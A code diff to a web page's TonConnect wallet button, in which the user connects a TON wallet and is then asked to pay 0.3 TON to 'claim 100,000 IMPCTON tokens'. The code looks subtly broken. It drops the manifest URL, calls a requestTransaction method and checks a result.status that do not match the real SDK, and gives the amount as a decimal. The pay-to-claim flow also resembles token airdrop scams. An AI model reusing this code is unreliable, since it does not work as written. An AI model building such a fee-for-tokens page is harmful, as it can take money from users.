@@ -1,3 +1,6 @@
+// Import TonConnect
+import { TonConnect } from '@tonconnect/sdk';
+
 // Initialize TON Connect
 const tonConnect = new TonConnect();
 
@@ -6,19 +9,22 @@ const connectButton = document.getElementById('tonconnect-button');
 
 // Event listener for Connect Button
 connectButton.addEventListener('click', async () => {
+    connectButton.disabled = true; // Disable button to prevent multiple clicks
+
     try {
-        // Request to connect the wallet
-        const provider = await tonConnect.connect({
-            manifestUrl: 'https://impton.vercel.app/tonconnect-manifest.json' // Provide the manifest URL
-        });
+        console.log('Attempting to connect wallet...');
+        
+        // Connect to the wallet asynchronously
+        await tonConnect.connect();
+        console.log('Wallet connected successfully!');
 
-        console.log('Wallet connected successfully!', provider);
-
-        // Call function to initiate payment after successful connection
+        // Initiate payment once wallet is connected
         await initiatePayment();
     } catch (error) {
         console.error('Failed to connect wallet:', error);
         alert('Error connecting to wallet. Please try again.');
+    } finally {
+        connectButton.disabled = false; // Re-enable button after the operation
     }
 });
 
@@ -28,11 +34,12 @@ async function initiatePayment() {
 
     try {
         const txParams = {
-            to: receivingAddress, // Your receiving TON wallet address
+            to: receivingAddress, 
             value: 0.3, // 0.3 TON
-            data: 'Claiming 100,000 IMPCTON tokens', // Transaction description
+            data: 'Claiming 100,000 IMPCTON tokens',
         };
 
+        console.log('Initiating payment transaction...');
         const result = await tonConnect.requestTransaction(txParams);
 
         if (result.status === 'success') {
